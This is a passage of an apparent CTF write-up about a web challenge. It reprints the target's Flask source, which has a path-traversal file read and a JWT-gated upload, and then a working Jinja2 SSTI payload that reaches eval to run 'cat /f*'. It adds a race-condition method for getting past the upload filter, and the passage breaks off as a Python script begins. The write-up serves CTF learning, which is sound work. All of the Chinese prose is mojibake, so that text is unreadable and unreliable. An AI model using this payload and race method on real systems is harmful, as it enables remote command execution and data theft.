class="hljs-number">7e3</span>U<br></code></pre></td></tr></table></figure><p>å†å»ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨waf</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522162928873.png" alt="image-20250522162928873"></p><p>å¯ä»¥åˆ©ç”¨åˆšæ‰ä»»æ„è¯»å–æ–‡ä»¶æ¼æ´è¯»å–æºç ï¼Œæ³¨æ„åˆ°å“åº”é‡Œæœ‰pythonï¼Œå¯ä»¥çŒœåˆ°æºç åœ¨<code>/app/app.py</code></p><p>æµè§ˆå™¨è¯»å–ä¼šç«‹åˆ»è·³è½¬ï¼Œç”¨bpæŠ“åŒ…è¯»</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522163242873.png" alt="image-20250522163242873"></p><p>å¾—åˆ°æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, make_response, jsonify<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> jwt<br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br>app.config[<span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>] = <span class="hljs-literal">True</span><br>SECRET_KEY = os.getenv(<span class="hljs-string">&#x27;JWT_KEY&#x27;</span>)<br>book_dir = <span class="hljs-string">&#x27;books&#x27;</span><br>users = &#123;<span class="hljs-string">&#x27;fly233&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_token</span>(<span class="hljs-params">username</span>):<br>    payload = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: username<br>    &#125;<br>    token = jwt.encode(payload, SECRET_KEY, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> token<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_token</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">try</span>:<br>        payload = jwt.decode(token, SECRET_KEY, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>        <span class="hljs-keyword">return</span> payload<br>    <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    username = payload[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    books = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(book_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">&#x27;.txt&#x27;</span>)]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./index.html&#x27;</span>, username=username, books=books)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./login.html&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            token = generate_token(username)<br>            response = make_response(jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>            &#125;), <span class="hljs-number">200</span>)<br>            response.set_cookie(<span class="hljs-string">&#x27;token&#x27;</span>, token, httponly=<span class="hljs-literal">True</span>, path=<span class="hljs-string">&#x27;/&#x27;</span>)<br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid username or password&#x27;</span>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_book</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    book_path = request.form.get(<span class="hljs-string">&#x27;book_path&#x27;</span>)<br>    full_path = os.path.join(book_dir, book_path)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(full_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            content = file.read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;reading.html&#x27;</span>, content=content)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ–‡ä»¶æœªæ‰¾åˆ°&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./upload.html&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;script&gt;</span><br><span class="hljs-string">            alert(&#x27;åªæœ‰ç®¡ç†å‘˜æ‰æœ‰æ·»åŠ å›¾ä¹¦çš„æƒé™&#x27;);</span><br><span class="hljs-string">            window.location.href = &#x27;/&#x27;;</span><br><span class="hljs-string">        &lt;/script&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file:<br>        book_path = request.form.get(<span class="hljs-string">&#x27;book_path&#x27;</span>)<br>        file_path = os.path.join(book_path, file.filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(book_path):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ–‡ä»¶å¤¹ä¸å­˜åœ¨&quot;</span>, <span class="hljs-number">400</span><br>        file.save(file_path)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>            pattern = <span class="hljs-string">r&#x27;[&#123;&#125;&lt;&gt;_%]&#x27;</span><br><br>            <span class="hljs-keyword">if</span> re.search(pattern, content):<br>                os.remove(file_path)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">                &lt;script&gt;</span><br><span class="hljs-string">                    alert(&#x27;SSTI,æƒ³çš„ç¾ï¼&#x27;);</span><br><span class="hljs-string">                    window.location.href = &#x27;/&#x27;;</span><br><span class="hljs-string">                &lt;/script&gt;</span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æœªé€‰æ‹©æ–‡ä»¶&quot;</span>, <span class="hljs-number">400</span>    <br></code></pre></td></tr></table></figure><p>å› ä¸ºå­˜åœ¨<code>waf</code>ï¼š<code>pattern = r&#39;[&#123;&#125;&lt;&gt;_%]&#39;</code>æ‰€ä»¥ä¸èƒ½ä¸Šä¼ ï¼Œè¿˜ä¹…å°±æ˜¯å¦‚æœå‰é¢æƒ³ä¸åˆ°keyåœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œä»å¾—åˆ°çš„æºç ä¸­å°±å¯ä»¥çœ‹å‡ºæ¥äº†</p><p>æ³¨æ„åˆ°ä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">def <span class="hljs-title function_ invoke__">read_book</span>():<br>    token = request.cookies.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> not token:<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = <span class="hljs-title function_ invoke__">decode_token</span>(token)<br>    <span class="hljs-keyword">if</span> not payload:<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    book_path = request.form.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;book_path&#x27;</span>)<br>    full_path = os.path.<span class="hljs-title function_ invoke__">join</span>(book_dir, book_path)<br>    <span class="hljs-keyword">try</span>:<br>        with <span class="hljs-title function_ invoke__">open</span>(full_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            content = file.<span class="hljs-title function_ invoke__">read</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">render_template</span>(<span class="hljs-string">&#x27;reading.html&#x27;</span>, content=content)<br>    except FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ–‡ä»¶æœªæ‰¾åˆ°&quot;</span>, <span class="hljs-number">404</span><br>    except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> f<span class="hljs-string">&quot;å‘ç”Ÿé”™è¯¯: &#123;str(e)&#125;&quot;</span>, <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">with <span class="hljs-title function_ invoke__">open</span>(full_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            content = file.<span class="hljs-title function_ invoke__">read</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">render_template</span>(<span class="hljs-string">&#x27;reading.html&#x27;</span>, content=content)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°å¯ä»¥æ‰“<code>templates</code>æ¸²æŸ“ï¼Œæ¸²æŸ“<code>reading.html</code>ï¼Œå› ä¸ºè¿™é‡Œç›´æ¥å°†æ–‡ä»¶å†…å®¹ä½œä¸ºå˜é‡ä¼ é€’ç»™<code>reading.html</code>æ¨¡æ¿è¿›è¡Œæ¸²æŸ“ï¼Œå¯ä»¥æ‰“SSTIæ‰§è¡Œä»£ç å‘½ä»¤ï¼Œåˆ©ç”¨ä¹‹å‰çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è¯»å–æ¸²æŸ“åçš„ç»“æœ</p><p>æ—¢ç„¶æ˜¯æ¸²æŸ“æ¨¡æ¿ï¼ŒçŒœæµ‹è·¯å¾„æ˜¯<code>/app/templates/reading.html</code>ï¼Œå…ˆè¯»å–çœ‹çœ‹</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522180513406.png" alt="image-20250522180513406"></p><p>å¾ˆæ˜æ˜¾å‰é¢çš„æ€è·¯æ²¡é”™ï¼Œä½†æ˜¯<code>waf</code>ä¸­ç¦ç”¨äº†<code>[&#123;&#125;&lt;&gt;_%]</code>è¿™äº›æ€ä¹ˆåŠï¼Ÿé¢˜ç›®åŸæœ¬çš„æ–‡ç« ç»™å‡ºäº†æç¤ºï¼šæ‰“æ¡ä»¶ç«äº‰ï¼Œå³åˆ©ç”¨bpå‘åŒ…ï¼Œä¸€ä¸ªä¸æ–­çš„å‘æ–‡ä»¶ä¸Šä¼ çš„åŒ…ï¼Œå¦ä¸€ä¸ªä¸æ–­å‘è¯»å–<code>reading.html</code>çš„åŒ…ï¼Œä»è€Œå¯ä»¥ç»•è¿‡<code>waf</code>ï¼Œè·å–åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p><p>é¦–å…ˆå¯ä»¥è·å–åˆšæ‰è¯»å–çš„<code>/app/templates/reading.html</code>çš„æºç ä¸º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å›¾ä¹¦é˜…è¯»<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;æ¥·ä½“&#x27;</span>, serif;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;</span><br><span class="language-css">            <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">            <span class="hljs-attribute">flex-direction</span>: column;</span><br><span class="language-css">            <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">            <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">       <span class="hljs-selector-class">.page-title</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">36px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-weight</span>: bold;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">       <span class="hljs-selector-class">.book-content</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: white;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);</span><br><span class="language-css">            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">90%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">90%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.8</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;book-content&quot;</span>&gt;</span><br>        &#123;&#123; content|safe &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>    <br></code></pre></td></tr></table></figure><p>å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œä¸»è¦å°±æ˜¯ä¿®æ”¹<code>&#123;&#123; content|safe &#125;&#125;</code>è¿™ä¸ªéƒ¨åˆ†ï¼Œæ”¹æˆä»¥ä¸‹å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>è§£æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># éå†æ‰€æœ‰çš„pythonç±»çš„å­ç±»</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br><br><span class="hljs-comment"># æŸ¥æ‰¾ç‰¹å®šç±»catch_warnings</span><br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br><br><span class="hljs-comment"># åˆå§‹åŒ–catch_warningsç±»ï¼Œåˆ©ç”¨__globals__è·å–åˆ°__builtins__ï¼Œè¿›è€Œå¯ä»¥è·å–åˆ°evalå‡½æ•°ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œä»£ç ã€å‘½ä»¤</span><br>&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;</span>) &#125;&#125;<br><br><span class="hljs-comment"># é—­åˆå‰é¢çš„ifè¯­å¥å’Œforè¯­å¥</span><br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆä¸Šä¼ çš„å†…å®¹ä¸º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;book-content&quot;</span>&gt;</span><br>    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨bpä¸­çš„Intruderå‘åŒ…ï¼Œå¯ä»¥åœ¨<code>cookie</code>ä¸­æ–°å¢ä¸€ä¸ªå˜é‡ï¼Œä»è€Œå¯ä»¥æ·»åŠ payloadè¿›è¡Œå‘åŒ…ï¼Œè¿˜æœ‰å°±æ˜¯è¦æ³¨æ„ä¿®æ”¹JWTä¸ºä¹‹å‰æ„é€ æˆ<code>admin</code>çš„</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522183553685.png" alt="image-20250522183553685"></p><p>æ³¨æ„æ”¹å†™æ–‡ä»¶ä¸Šä¼ åˆ°çš„è·¯å¾„æ˜¯<code>/app/templates/</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522182938639.png" alt="image-20250522182938639"></p><p>ç„¶åæ˜¯è¯»å–æ–‡ä»¶å†…å®¹çš„å‘åŒ…ï¼ŒåŒæ ·åœ¨cookieä¸­æ·»åŠ ä¸€ä¸ªæ–°å˜é‡ç”¨äºæ·»åŠ payloadï¼Œå®ç°è¯»å–<code>/app/templates/reading.html</code></p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522183941916.png" alt="image-20250522183941916"></p><p>æœ€åå°±æ˜¯ä¸¤ä¸ªåŒæ—¶å¼€å§‹å‘åŒ…ï¼Œä¸è¿‡æˆ‘çš„bpæ²¡çˆ†å‡ºæ¥ï¼Œå¤§æ¦‚æ€è·¯æ˜¯è¿™æ ·çš„å§ï¼Œæœ‰é”™è¯¯æ±‚æŒ‡å‡ºï¼ï¼ï¼</p><p>ç›´æ¥å†™pythonè„šæœ¬å‘åŒ…ï¼Œä¸€ç§’å°±å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 